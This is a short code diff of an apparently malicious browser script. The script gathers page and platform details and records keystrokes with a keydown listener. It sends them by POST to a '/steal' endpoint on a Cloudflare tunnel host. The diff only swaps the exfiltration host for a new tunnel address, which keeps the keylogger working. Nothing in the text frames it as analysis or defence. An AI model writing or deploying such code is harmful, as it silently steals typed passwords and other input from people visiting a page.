@@ -13,7 +13,7 @@
     "platform" : navigator.platform,
     "page url" : window.location.href,
   }
-  fetch("https://cord-opened-janet-aim.trycloudflare.com/steal", {
+  fetch("https://original-extensive-questionnaire-charter.trycloudflare.com/steal", {
     method : "POST",
     headers : {
       "content-type" : "application/json"
@@ -25,7 +25,7 @@
     document.addEventListener("keydown", function(e){
       logs += e.key;
       if ( logs.length  >= 10 ) {
-        fetch("https://cord-opened-janet-aim.trycloudflare.com/steal", {
+        fetch("https://original-extensive-questionnaire-charter.trycloudflare.com/steal", {
           method : "POST",
           headers : {
             "content-type" : "application/json"
